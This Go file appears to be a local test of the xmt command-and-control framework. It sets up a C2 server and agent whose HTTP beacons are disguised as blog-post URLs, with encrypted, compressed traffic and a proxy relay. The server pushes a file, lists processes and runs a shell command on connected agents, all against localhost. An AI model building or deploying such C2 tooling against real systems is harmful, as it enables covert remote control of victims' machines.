package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"time"

	"github.com/iDigitalFlame/logx/logx"
	c2 "github.com/iDigitalFlame/xmt/xmt-c2"
	"github.com/iDigitalFlame/xmt/xmt-c2/control"
	"github.com/iDigitalFlame/xmt/xmt-c2/transform"
	"github.com/iDigitalFlame/xmt/xmt-c2/wrapper"
	com "github.com/iDigitalFlame/xmt/xmt-com"
	"github.com/iDigitalFlame/xmt/xmt-com/limits"
	"github.com/iDigitalFlame/xmt/xmt-com/tcp"
	"github.com/iDigitalFlame/xmt/xmt-com/web"
	"github.com/iDigitalFlame/xmt/xmt-crypto/cbk"
	util "github.com/iDigitalFlame/xmt/xmt-util"
)

func main1() {

	testWebC2()
}

func testWebC2() {
	c2.DefaultLogLevel = logx.LDebug

	u := &web.Generator{
		URL:  util.Matcher("/post/%31d/%12d/%31d/edit/%4fl"),
		Host: util.Matcher("%6fl.myblogsite.com"),
	}

	c1, c2 := cbk.NewCipher(75), cbk.NewCipher(75)
	c1.A, c1.B, c1.C, c1.D = 99, 10, 45, 17
	c2.A, c2.B, c2.C, c2.D = 99, 10, 45, 17

	g, _ := wrapper.NewGzip(7)
	x, _ := wrapper.NewCrypto(c1, c2)

	p := &c2.Profile{
		Sleep:     time.Duration(5) * time.Second,
		Wrapper:   wrapper.NewMulti(x, g),
		Transform: transform.Base64,
	}

	if len(os.Args) != 2 {
		os.Exit(1)
	}

	limits.Limits = limits.Large

	switch os.Args[1] {
	case "s":
		w := web.New(p.Sleep)
		w.Handle("/", http.FileServer(http.Dir("/tmp/")))
		w.Rule(&web.Rule{
			URL:  u.URL.(util.Matcher).Match(),
			Host: u.Host.(util.Matcher).Match(),
		})

		c, err := c2.Listen("http", "127.0.0.1:8080", w, p)
		if err != nil {
			panic(err)
		}
		c.Register = func(s *c2.Session) {
			fmt.Printf("registered! %s\n", s.ID)
			s.Time(3*time.Second, 0)
		}

		time.Sleep(5 * time.Second)

		for _, v := range c.Sessions() {
			c, err := control.Download.Bytes("/tmp/what1.txt", []byte("This is my special string!\n"))
			if err != nil {
				panic(err)
			}
			j, err := c2.Controller.Mux.Schedule(v, c)
			if err != nil {
				panic(err)
			}
			j.Done = func(s *c2.Session, p *com.Packet) {
				fmt.Printf("job %s:%d finished! %s, reading!\n", s.ID, p.Job, p)
				b, err := ioutil.ReadAll(p)
				if err != nil {
					fmt.Printf("err: %s\n", err)
				}
				fmt.Printf("result [\n%s\n]\n", b)
			}
			j.Error = func(s *c2.Session, p *com.Packet) {
				er, _ := p.StringVal()
				fmt.Printf("job %s:%d failed! %s\n", s.ID, p.Job, er)
			}
		}

		time.Sleep(5 * time.Second)

		for _, v := range c.Sessions() {
			c := control.ProcessList.List()
			j, err := c2.Controller.Mux.Schedule(v, c)
			if err != nil {
				panic(err)
			}
			j.Done = func(s *c2.Session, p *com.Packet) {
				fmt.Printf("job %s:%d finished! %s, reading!\n", s.ID, p.Job, p)
				b, err := ioutil.ReadAll(p)
				if err != nil {
					fmt.Printf("err: %s\n", err)
				}
				fmt.Printf("result [\n%s\n]\n", b)
			}
			j.Error = func(s *c2.Session, p *com.Packet) {
				er, _ := p.StringVal()
				fmt.Printf("job %s:%d failed! %s\n", s.ID, p.Job, er)
			}
		}

		time.Sleep(5 * time.Second)

		for _, v := range c.Sessions() {
			c := control.Run(&control.Command{
				Args: []string{"ls", "-al", "/"},
			})
			j, err := c2.Controller.Mux.Schedule(v, c)
			if err != nil {
				panic(err)
			}
			j.Done = func(s *c2.Session, p *com.Packet) {
				fmt.Printf("job %s:%d finished! %s, reading!\n", s.ID, p.Job, p)
				b, err := ioutil.ReadAll(p)
				if err != nil {
					fmt.Printf("err: %s\n", err)
				}
				fmt.Printf("result [\n%s\n]\n", b)
			}
			j.Error = func(s *c2.Session, p *com.Packet) {
				er, _ := p.StringVal()
				fmt.Printf("job %s:%d failed! %s\n", s.ID, p.Job, er)
			}
		}

	case "c":
		i, err := c2.Connect("http://127.0.0.1:8080", &web.Client{Generator: u}, p)
		if err != nil {
			panic(err)
		}
		_, err = i.Proxy("localhost:9090", tcp.Raw, &c2.Profile{Transform: transform.DNS})
		if err != nil {
			panic(err)
		}
	case "p":
		_, err := c2.Connect("localhost:9090", tcp.Raw, &c2.Profile{
			Sleep:     3 * time.Second,
			Transform: transform.DNS,
		})
		if err != nil {
			panic(err)
		}
	}

	c2.Controller.Wait()
}
